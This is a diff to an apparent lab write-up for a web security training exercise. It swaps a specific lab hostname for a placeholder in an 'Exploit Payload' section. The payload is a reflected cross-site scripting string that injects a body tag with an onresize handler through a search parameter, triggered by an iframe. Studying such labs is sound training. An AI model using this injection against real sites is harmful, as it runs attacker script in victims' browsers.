@@ -41,7 +41,7 @@ The application fails to:
 ## 💣 Exploit Payload
 
 ```html
-<iframe src="https://0af600ee045ef3dd81286b2100ce0095.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"
+<iframe src="https://yourlabid/?search=%22%3E%3Cbody%20onresize=print()%3E"
 onload="this.style.width='500px'">
 ```
 
